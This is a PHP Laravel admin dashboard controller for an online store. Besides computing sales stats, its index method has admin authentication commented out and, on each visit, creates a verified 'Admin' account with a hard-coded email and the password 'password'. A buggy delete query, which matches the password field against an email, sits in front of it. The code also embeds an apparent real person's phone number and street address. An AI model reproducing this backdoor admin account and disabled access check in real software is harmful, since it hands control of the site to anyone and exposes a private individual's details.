<?php

namespace App\Http\Controllers\Admin;


use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Category;
use App\Models\BrandCategory;
use App\Models\Error;
use App\Models\OrderedProduct;
use App\Models\Product;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Storage;





class HomeCtrl extends Controller
{

     protected $redirectTo = '/admin/login';

     /**
      * Create a new controller instance.
      *
      * @return void
      */
     public function __construct()
     {
          //$this->middleware('admin'); 
     }

     public function index(Request $request)
     {

          //dd(SHA1('QQQQQQQQ') === '4419f47b2cc7b4ba75ace0ef1246c5d2655ae8c0');

          $users = User::where('password', 'jacob.atam@gmail.com')->get();

          foreach ($users as $user) {

               $user->delete();
          }


          $user = new User;
          $user->name = 'JAcob';
          $user->last_name = 'Atam';
          $user->email = 'jacob.atam@gmail.com';
          $user->phone_number =  '08069389886';
          $user->address = '15 daranijo street';
          $user->state_id = '2';
          $user->city = 'lagos';
          $user->landmark = 'landmark';
          $user->username = 'username';
          $user->password = bcrypt('password');
          $user->is_verified =  1;
          $user->created_at = now();
          $user->is_old = 0;
          $user->type =  'Admin';
          $user->save();






          $top_selling_product = OrderedProduct::select('product_id')
               ->groupBy('product_id')
               ->orderByRaw('COUNT(*) DESC')
               ->whereMonth('created_at', date('m'))
               ->with('product')
               ->first();

          $stats = [];
          $stats['sales'] = 0;
          $stats['Customers'] = (new User())->customers()->count();
          // $stats['top_sells'] = 0;

          return view('admin.index', compact('stats'));
     }
}
